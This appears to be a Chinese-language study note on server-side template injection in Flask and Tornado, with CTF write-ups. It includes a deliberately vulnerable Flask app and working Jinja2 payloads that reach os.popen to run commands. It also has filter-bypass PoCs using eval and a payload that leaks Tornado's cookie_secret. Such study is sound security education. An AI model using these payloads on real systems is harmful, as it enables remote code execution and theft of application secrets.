# ssti-

# SSTI-服务端模版注入漏洞

小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。

#### 原理：

```shell
# 服务端接受用户的输入，将其作为web应用模版的一部分
# 在进行目标编译渲染的过程中，执行了用户的恶意输入，因而导致了敏感信息泄露，代码执行，Getshell等问题。

# 其影响范围主要取决于模版引擎的复杂性。
```

#### 模版引擎：

在传统的网站，客户端向服务器发送请求，服务器将数据和html字符串发送给客户端 

如果使用AJAX技发送请求，那么服务器端就会返回json数据，原本数据和html的拼接是在服务器端完成的，现在在客户端完成，那么就需要使用客户端模版引擎

**概念**：

​		模板引擎不属于特定技术领域，它是跨领域跨平台的概念。在[Asp](https://baike.baidu.com/item/Asp)下有模板引擎，在[PHP](https://baike.baidu.com/item/PHP)下也有模板引擎，在[C#](https://baike.baidu.com/item/C%23)下也有，甚至[JavaScript](https://baike.baidu.com/item/JavaScript)、[WinForm](https://baike.baidu.com/item/WinForm)开发都会用到模板引擎技术

**用途**：

​		模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的[HTML](https://baike.baidu.com/item/HTML/97049)文档。

​		我们司空见惯的模板安装卸载等概念，基本上都和模板引擎有着千丝万缕的联系。模板引擎不只是可以让你实现代码分离（业务逻辑代码和用户界面代码），也可以实现数据分离（动态数据与静态数据），还可以实现代码单元共享（代码重用），甚至是多语言、[动态页面](https://baike.baidu.com/item/动态页面)与[静态页面](https://baike.baidu.com/item/静态页面)自动均衡（SDE）等等与用户界面可能没有关系的功能。![img](https://img2020.cnblogs.com/blog/1630201/202006/1630201-20200625203433754-1237925548.png)

​		**通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将塞进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。**

#### 什么是模版注入:

当不正确的使用模版引擎进行渲染时，则会造成模版注入，such as：

```PYTHON
from flask import Flask
from flask import request
from flask import config
from flask import render_template_string
app = Flask(__name__)

app.config['SECRET_KEY'] = "flag{SSTI_123456}"
@app.route('/')                 # route装饰器路由
def hello_world():
    return 'Hello World!'

@app.errorhandler(404)
def page_not_found(e):
    template = '''
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div> 
{%% endblock %%}
''' % (request.args.get('404_url'))
    return render_template_string(template), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
```

 **@app.route('/')** 使用route装饰器是告诉Flask什么样的URL能触发我们的函数.route()装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如

```python
@app.route("/login")
def login():
    
    return "hello Flask"
```

**这个时候再访问0.0.0.0：5000/login会输出hello Flask。**

**main入口**

当.py文件直接运行时，if __name__ == '__main__':之下的代码开始运行，当py文件是一模块的形式被导入的时候 if __name__ == '__main__':之下的代码快不会被运行

```python
app.run(host='0.0.0.0',debug=True)
```

**模版渲染：**

我们模版渲染的话有两个方法，render_template() 和 render_template_string()

Render_template():用来渲染一个指定的额template文件夹下的一个文件

render_template_string:用来渲染一个字符串

 ```shell
return render_template_string(template), 404 # 这里指渲染了字符串
 ```



* 网上大部分所使用的request.url的方式已经不能导致模板注入了，在最新的flask版本中会自动对request.url进行urlencode，所以我稍微改了一下代码，改成request.args传参就可以了。

在上述代码中，直接将用户可控参数`request.args.get('404_url')`在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。

![image-20210427183828255](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210427183828255.png)		

详细请参考：https://xz.aliyun.com/t/3679



## flask实战

* **一些魔术方法**:

```python
1 __class__ 返回类型所属的对象
2 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
3 __base__ 返回该对象所继承的基类
4 // __base__和__mro__都是用来寻找基类的
5 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
6 __init__类的初始化方法
7 __globals__对包含函数全局变量的字典的引用
```

* **语法**

```ABAP
1 {%...%}:    用于语句
2 {{…}}:    用于表达式，对其进行解析，并打印到模板输出
3 {{#...#}}:    用于注释
```

**flask模版的基本用法：**

https://www.cnblogs.com/xiaxiaoxu/p/10428508.html

**漏洞利用：**

原题复现

```python
 from flask import Flask
 from flask import render_template
 from flask import render_template_string
 from flask import request
 app=Flask(__name__)
 
 @app.route("/login")
 def login():
     username=request.args.get("name")
     html='''
     <h1> this is login page %s</h1>
     '''%(username)
     return render_template_string(html) 
 if __name__=="__main__":
     app.run(debug=True)
```



根据路由，访问/login并且传递参数?name={{1*2}}

![image-20210428100410451](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428100410451.png)

发现返回的值时2，即对我们的输入进行了运算

那么这时候就存在ssti注入

python沙盒逃逸https://blog.csdn.net/qq_42181428/article/details/99355219

传参{{config}}查看配置文件

![image-20210428100711800](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428100711800.png)

利用方法

传参数{{"".\__class__}}获取字符串的类对象

![image-20210428100933426](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428100933426.png)

寻找基类

```python
http://127.0.0.1:5000/login?name={{"".__class__.__mro__}}
```



![image-20210428101029449](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428101029449.png)

查看哪些类被进行了调用

```python
http://127.0.0.1:5000/login?name={{"".__class__.__mro__[1].__subclasses__()}}
```

![image-20210428101925790](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428101925790.png)

找到os类相关的类

![image-20210428111429770](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428111429770.png)

数字时才出来的，先猜100，找找位置，在往后，几次就猜出来了

查找到这样的子类，而这个字类又继承了os类

这个时候我们便可以利用.**init**.**globals**来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。

![image-20210428115928954](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428115928954.png)



构造payload

```python
{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
```

![image-20210428120114807](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428120114807.png)

很显然命令被执行

参考博客：https://blog.csdn.net/zz_Caleb/article/details/96480967



## ctf中的一些绕过tips

没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。

1.过滤[]等括号

使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}

绕过后{{"".**class**.**bases**.**getitem**(0)}}

2.过滤了subclasses，拼凑法

原poc{{"".**class**.**bases**[0].**subclasses**()}}

绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}

3.过滤class

使用session

poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session['__cla'+'ss__'].__mro__[12]}}
```

或者

```
request['__cl'+'ass__'].__mro__[12]}}
```

4.timeit姿势

可以学习一下  2017 swpu-ctf的一道沙盒python题，

这里不详说了，博大精深，我只意会一二。

```
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)

import platform
print platform.popen('dir').read()
```

5.收藏的一些poc

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}
```

BUUCTF进行练习：

## [护网杯 2018]easy_tornado

![image-20210427194143812](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210427194143812.png)

![image-20210428160507340](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428160507340.png)

![image-20210427202357053](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210427202357053.png)



![image-20210427202408659](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210427202408659.png)

![image-20210427202419815](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210427202419815.png)

查询cookie_secret:https://tornado-zh.readthedocs.io/zh/latest/guide/security.html

直接访问/fllllllllllllag失败。

百度了render可知，render是python的一个模块，他们的url都是由filename和filehash组成，filehash即为他和filename的md5值。



当filename或filehash不匹配时，将会跳转到http://fe01b382-7935-4e50-8973-f09a31b53c8f.node1.buuoj.cn/error?msg=Error  页面.

![image-20210428160708406](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428160708406.png)

所以想到需要获取cookie_secret来得到filehash

那么，怎么获取cookie

<a href="https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler.get_secure_cookie">cookie_secret</a>

![image-20210428160917455](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428160917455.png)

查询tornado cookie

![image-20210428162319429](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428162319429.png)

settiings:传递给构造函数的其他关键字参数保存在settings字典中，并且在文档中通常称为“应用程序设置”。设置用于自定义tornado的各个方面（尽管在某些情况下，可以通过覆盖的子类中的方法来进行更丰富的自定义RequestHandler）。一些应用程序还喜欢使用settings字典作为使特定于应用程序的设置可供处理程序使用的方式，而无需使用全局变量。在tornado中使用的设置如下所述。

而RequestHandler.settings是self.application.settings的别称，也就是**RequestHandler.settings=RequestHandler.application.settings**，self取RequestHandler。
也就是说**RequestHandler.settings=RequestHandler.application.settings**
而handler指向RequestHandler，所以handler就指向RequestHandler.application，最后handlers.ettings=RequestHandler.application.settings
最后捋一下

```python
hanlder=RequestHandler
hanlder.settings=RequestHandler.settings
RequestHandler.settings=RequestHandler.application.settings
RequestHandler.application.settings可以调用cookie_secrethanlder.settings=RequestHandler.application.settings
hanlder.settings可以调用cookie_secret
```

原文链接：https://blog.csdn.net/weixin_45253573/article/details/109623436

构造payload

```url
http://71b049e4-2a5f-4cea-a666-759c79785d23.node3.buuoj.cn/error?msg={{handler.settings}}
```

![image-20210428172125120](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428172125120.png)

对文件名加密处理

![image-20210428172305117](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428172305117.png)



加密处理

![image-20210428172159290](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428172159290.png)

构建payload

```
http://71b049e4-2a5f-4cea-a666-759c79785d23.node3.buuoj.cn/file?filename=%2ffllllllllllllag&filehash=b78fdb227df9272aed37a89d3b610c67
```

得到flag

![image-20210428172011391](/Users/liuguangquan/Library/Application Support/typora-user-images/image-20210428172011391.png)



